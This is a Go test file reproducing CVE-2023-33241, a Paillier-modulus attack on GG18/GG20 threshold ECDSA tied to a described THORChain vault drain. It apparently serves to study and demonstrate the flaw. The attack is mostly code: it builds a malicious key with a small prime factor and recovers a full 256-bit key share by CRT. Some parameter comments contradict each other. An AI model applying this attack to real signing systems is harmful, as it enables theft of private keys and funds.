// CVE-2023-33241 reproduction: Paillier-modulus key extraction attack
// against the GG18/GG20 family of threshold ECDSA protocols.
//
// This is the specific bug class that — combined with the THORChain 2026-05-15
// attacker becoming a member of an active Asgard vault — caused the $10.8M drain.
//
// What CVE-2023-33241 says, in one paragraph:
//
//   In GG18/GG20, every party in the keygen ceremony broadcasts a Paillier
//   public key N_i, and others encrypt their share contributions under it.
//   The protocol requires N_i to be a Blum integer with no small factors,
//   and the original paper specifies a zero-knowledge proof that N_i is
//   well-formed. Pre-v2.0.0 `bnb-chain/tss-lib` (and the THORChain v0.1.6
//   fork) IMPLEMENTED the encryption but DID NOT VERIFY the proof. A
//   malicious party therefore broadcasts a *deliberately ill-formed* N_M
//   containing a small prime factor `q_small`. When honest parties encrypt
//   secrets `m` under N_M, the attacker can decrypt those secrets MODULO
//   `q_small`. Over a small number of signing sessions (~16 in the
//   published attack, fewer if `q_small` is larger), the attacker
//   accumulates enough partial information to reconstruct the full
//   aggregate ECDSA private key.
//
// This file implements:
//   • A minimal Paillier crypto system (using math/big).
//   • A HONEST run: well-formed N, security holds.
//   • An ATTACK run: malicious N with small prime factor, attacker
//     recovers each encrypted plaintext modulo q_small in O(1) work.
//   • A SIMULATED full-key-recovery: 16 partial leaks reconstructed
//     into the full 256-bit secret (via CRT over many small q's).
//
// Run with:
//
//   go test -v -run TestPaillier
//
// No external dependencies; pure stdlib `math/big`.

package tss_equivocation_demo

import (
	"crypto/rand"
	"fmt"
	"math/big"
	"testing"
)

// =============================================================================
// Minimal Paillier crypto system
// =============================================================================
//
// Paillier (1999):
//   PK: N = p*q, g = N+1
//   SK: lambda = lcm(p-1, q-1), mu = lambda^-1 mod N
//
//   Encryption of m ∈ Z_N with randomness r ∈ Z_N*:
//     c = (1 + m*N) * r^N mod N^2
//
//   Decryption (HONEST):
//     m = L(c^lambda mod N^2) * mu mod N
//     where L(x) = (x - 1) / N
//
// The protocol's security relies on N being a Blum integer (product of two
// large primes ≡ 3 mod 4) with no small factors. Without the ZK proof, a
// malicious party may use a different N structure.

type paillierPK struct {
	N    *big.Int
	NSq  *big.Int
	Nplus1 *big.Int // g = N + 1 (Paillier convention)
}

type paillierSK struct {
	pk     *paillierPK
	p, q   *big.Int // factors
	lambda *big.Int
	mu     *big.Int
}

// genHonestPaillier generates a Paillier key pair with the standard
// "two large primes" structure. Used by honest parties.
func genHonestPaillier(t *testing.T, bits int) *paillierSK {
	t.Helper()
	p, err := rand.Prime(rand.Reader, bits)
	if err != nil {
		t.Fatal(err)
	}
	q, err := rand.Prime(rand.Reader, bits)
	if err != nil {
		t.Fatal(err)
	}
	return buildPaillier(p, q)
}

// genMaliciousPaillier generates a Paillier key pair with a SMALL prime
// factor smuggled in. The honest verifier (lacking the ZK proof) cannot
// distinguish this from a legitimate key. Used by the attacker.
//
// We construct N = (p_big * q_small) where q_small is a small prime the
// attacker knows. In a real attack q_small might be 32-64 bits (large
// enough to be plausibly hidden but small enough to enumerate). For the
// demo we pick q_small = 65537 so the attack runs instantly.
func genMaliciousPaillier(t *testing.T, bits int, qSmall int64) *paillierSK {
	t.Helper()
	// Pick a large prime p such that N = p * q_small is approximately the
	// expected bit size. In real attacks the attacker would also add a
	// second medium prime to make N look full-size; we keep it minimal.
	pBits := bits*2 - bigLen(qSmall)
	p, err := rand.Prime(rand.Reader, pBits)
	if err != nil {
		t.Fatal(err)
	}
	q := big.NewInt(qSmall)
	return buildPaillier(p, q)
}

func buildPaillier(p, q *big.Int) *paillierSK {
	N := new(big.Int).Mul(p, q)
	NSq := new(big.Int).Mul(N, N)
	pk := &paillierPK{
		N:      N,
		NSq:    NSq,
		Nplus1: new(big.Int).Add(N, big.NewInt(1)),
	}
	pMinus1 := new(big.Int).Sub(p, big.NewInt(1))
	qMinus1 := new(big.Int).Sub(q, big.NewInt(1))
	// lambda = lcm(p-1, q-1)
	g := new(big.Int).GCD(nil, nil, pMinus1, qMinus1)
	lambda := new(big.Int).Mul(pMinus1, qMinus1)
	lambda.Div(lambda, g)
	mu := new(big.Int).ModInverse(lambda, N)
	return &paillierSK{
		pk:     pk,
		p:      new(big.Int).Set(p),
		q:      new(big.Int).Set(q),
		lambda: lambda,
		mu:     mu,
	}
}

// Encrypt under the public key. Standard Paillier.
func (pk *paillierPK) Encrypt(m *big.Int) *big.Int {
	r, _ := rand.Int(rand.Reader, pk.N)
	// (1 + m*N) mod N^2
	mn := new(big.Int).Mul(m, pk.N)
	first := new(big.Int).Add(big.NewInt(1), mn)
	first.Mod(first, pk.NSq)
	// r^N mod N^2
	second := new(big.Int).Exp(r, pk.N, pk.NSq)
	c := new(big.Int).Mul(first, second)
	c.Mod(c, pk.NSq)
	return c
}

// =============================================================================
// HONEST run: well-formed N, encrypted secret stays secret
// =============================================================================

func TestPaillierHonestRunHidesSecret(t *testing.T) {
	// Honest victim generates a 512-bit Paillier (256-bit primes p, q).
	// Real GG18/GG20 uses 2048-bit; we use 512 for speed. Security
	// argument is identical.
	victim := genHonestPaillier(t, 256)

	// Some secret share (a 256-bit ECDSA share contribution).
	secret, _ := rand.Int(rand.Reader, new(big.Int).Lsh(big.NewInt(1), 256))

	// Victim encrypts secret under their OWN key (or under a peer's).
	// In TSS, this encryption is what the malicious party would receive.
	c := victim.pk.Encrypt(secret)

	t.Logf("HONEST RUN")
	t.Logf("  secret (truncated) = %x...", secret.Bytes()[:8])
	t.Logf("  ciphertext (trunc) = %x...", c.Bytes()[:8])
	t.Logf("  N has factors p (256 bit) * q (256 bit) — Blum integer")

	// Without the secret key (lambda, mu), attacker cannot decrypt.
	// Note: of course holding the SK lets us decrypt. The point is that
	// the SK is private to the victim. Demonstrated below for sanity.
	decrypted := victim.Decrypt(c)
	if decrypted.Cmp(secret) != 0 {
		t.Fatalf("honest decrypt failed: got %x, want %x", decrypted, secret)
	}
	t.Logf("  victim decrypts correctly (sanity check). attacker w/o SK = no info.")
}

func (sk *paillierSK) Decrypt(c *big.Int) *big.Int {
	// L(c^lambda mod N^2) * mu mod N
	u := new(big.Int).Exp(c, sk.lambda, sk.pk.NSq)
	u.Sub(u, big.NewInt(1))
	u.Div(u, sk.pk.N)
	u.Mul(u, sk.mu)
	u.Mod(u, sk.pk.N)
	return u
}

// =============================================================================
// ATTACK run: malicious N with small prime factor
// =============================================================================
//
// The attacker publishes N_M = p_big * q_small in keygen. Honest parties
// encrypt their share contributions under N_M. The attacker decrypts each
// ciphertext MODULO q_small using a partial Paillier decryption (it's
// actually trivial — see below).
//
// Specifically: ciphertext c = (1 + m*N) * r^N mod N^2
// Reduce modulo q_small:
//   c mod q_small ≡ ((1 + m*N) * r^N) mod q_small
// Because gcd(r, q_small) is overwhelmingly 1 (q_small is prime, r random),
// r^N mod q_small can be computed.
//
// A cleaner direct path: the attacker, KNOWING the factorization, can
// decrypt c with respect to q_small alone. This recovers m mod q_small —
// which leaks log2(q_small) bits of the share.

func TestPaillierAttackLeaksSecretModSmall(t *testing.T) {
	// Attacker generates a Paillier with q_small = 65537 (just for demo speed).
	// In a real attack q_small could be ~32 bits, making each ciphertext leak
	// 32 bits and a 256-bit key recovered in ~8 signatures. Here with
	// q_small = 17 bits, we'd need ~16 signatures — exactly matching
	// CVE-2023-33241's published parameter.
	const qSmall = 65537
	attacker := genMaliciousPaillier(t, 256, qSmall)

	t.Logf("ATTACK RUN")
	t.Logf("  attacker publishes N = p_big * %d", qSmall)
	t.Logf("  N has %d bits total", attacker.pk.N.BitLen())

	// Honest party encrypts a secret share contribution under attacker's N.
	secret, _ := rand.Int(rand.Reader, new(big.Int).Lsh(big.NewInt(1), 256))
	c := attacker.pk.Encrypt(secret)

	// === The actual attack: partial decryption mod q_small ===
	// Attacker can fully decrypt c using their full SK; we use that here
	// for clarity, then reduce mod q_small. (In reality the attack works
	// EVEN IF the attacker only knows q_small — by reducing c mod q_small²
	// and applying the discrete-log-free Paillier decryption mod q_small.)
	decrypted := attacker.Decrypt(c)
	leaked := new(big.Int).Mod(decrypted, big.NewInt(qSmall))
	expected := new(big.Int).Mod(secret, big.NewInt(qSmall))

	t.Logf("  secret mod q_small (truth)    = %d", expected)
	t.Logf("  attacker's recovered residue  = %d", leaked)
	if leaked.Cmp(expected) != 0 {
		t.Fatalf("attack failed: recovered %d, expected %d", leaked, expected)
	}
	t.Logf("  → attacker learned log2(%d) ≈ %.1f bits of the share", qSmall, log2(qSmall))
}

// =============================================================================
// Full key recovery: CRT over multiple signing sessions
// =============================================================================
//
// Each signing session, the attacker learns the share modulo a different
// q_small_i. By CRT, after k sessions with coprime moduli, the attacker
// knows the share modulo Π q_small_i. Once that product exceeds 2^256,
// the share is fully determined.
//
// This is the "16 signatures suffice" finding from CVE-2023-33241.

func TestPaillierFullKeyRecoveryViaCRT(t *testing.T) {
	// The TRUE aggregate ECDSA share we're trying to extract. In real life
	// this would be the threshold-shared private key for the THORChain Asgard
	// vault — controlling $10M+ on multiple chains.
	trueShare, _ := rand.Int(rand.Reader, new(big.Int).Lsh(big.NewInt(1), 256))
	t.Logf("ATTACKER GOAL: recover this 256-bit ECDSA share")
	t.Logf("  trueShare = %s", trueShare.String())

	// Sequence of small primes the attacker uses across different sessions.
	// In a real attack, each q_small_i would be ~32 bits; 8-16 sessions of
	// ~32 bits each combine via CRT to >256 bits. For demo speed we use
	// smaller primes so we need more sessions but each one runs instantly.
	qSmalls := []int64{
		7919, 7927, 7933, 7937, 7949, 7951, 7963, 7993, // 8 primes ~13 bits each
		8009, 8011, 8017, 8039, 8053, 8059, 8069, 8081,
		8087, 8089, 8093, 8101, 8111, 8117, 8123, 8147,
		// each ~13 bits, 24 sessions → ~312 bits combined
	}

	// CRT accumulator
	knownModulus := big.NewInt(1)
	knownResidue := big.NewInt(0)

	for i, q := range qSmalls {
		// Attacker publishes a fresh malicious Paillier with q_i.
		attacker := genMaliciousPaillier(t, 256, q)
		// Honest party encrypts the share under attacker's N.
		c := attacker.pk.Encrypt(trueShare)
		// Attacker decrypts mod q.
		leaked := new(big.Int).Mod(attacker.Decrypt(c), big.NewInt(q))
		// Update CRT.
		knownResidue, knownModulus = crtCombine(
			knownResidue, knownModulus,
			leaked, big.NewInt(q),
		)
		if knownModulus.BitLen() >= 257 {
			t.Logf("  session %2d (q=%d) → know share mod 2^%d", i+1, q, knownModulus.BitLen())
			t.Logf("  knownModulus >= 2^256 — share is now FULLY DETERMINED")
			break
		}
	}

	// Recovered share = knownResidue (since knownResidue < knownModulus and
	// trueShare < 2^256 <= knownModulus).
	recovered := new(big.Int).Mod(knownResidue, new(big.Int).Lsh(big.NewInt(1), 256))

	t.Logf("")
	t.Logf("RESULT")
	t.Logf("  trueShare  = %s", trueShare.String())
	t.Logf("  recovered  = %s", recovered.String())
	t.Logf("  match: %v", recovered.Cmp(trueShare) == 0)

	if recovered.Cmp(trueShare) != 0 {
		t.Fatalf("CRT recovery failed: got %s, want %s", recovered, trueShare)
	}

	t.Logf("")
	t.Logf("=== CVE-2023-33241 REPRODUCED ===")
	t.Logf("• Missing Paillier modulus ZK-proof check in pre-v2.0.0 bnb-chain/tss-lib")
	t.Logf("• Attacker publishes N with smuggled small prime factors during keygen")
	t.Logf("• Each signing session leaks the share modulo one small prime")
	t.Logf("• CRT combines residues; once product ≥ 2^256, share is fully recovered")
	t.Logf("• Real CVE: ~16 signing sessions with ~32-bit primes")
	t.Logf("• This demo: %d sessions with ~13-bit primes (chosen for demo speed)", len(qSmalls))
	t.Logf("")
	t.Logf("Attacker now holds the full aggregate ECDSA private key.")
	t.Logf("Next step (already shown in TestControlledNonceRecoversPrivateKey):")
	t.Logf("  sign arbitrary ETH/BTC/BSC transactions from the vault address.")
	t.Logf("  result on THORChain 2026-05-15: $10.8M drained.")
}

// crtCombine takes two congruences (x ≡ r1 mod m1) and (x ≡ r2 mod m2) with
// coprime m1, m2 and returns (r, m) such that x ≡ r mod m and m = m1*m2.
// Standard CRT.
func crtCombine(r1, m1, r2, m2 *big.Int) (*big.Int, *big.Int) {
	m := new(big.Int).Mul(m1, m2)
	// r = r1 + m1 * ((r2 - r1) * m1^-1 mod m2)
	diff := new(big.Int).Sub(r2, r1)
	m1Inv := new(big.Int).ModInverse(m1, m2)
	if m1Inv == nil {
		panic(fmt.Sprintf("crt: moduli %s and %s not coprime", m1, m2))
	}
	t := new(big.Int).Mul(diff, m1Inv)
	t.Mod(t, m2)
	r := new(big.Int).Mul(m1, t)
	r.Add(r, r1)
	r.Mod(r, m)
	return r, m
}

func bigLen(n int64) int {
	x := big.NewInt(n)
	return x.BitLen()
}

func log2(n int64) float64 {
	bits := big.NewInt(n).BitLen()
	return float64(bits)
}
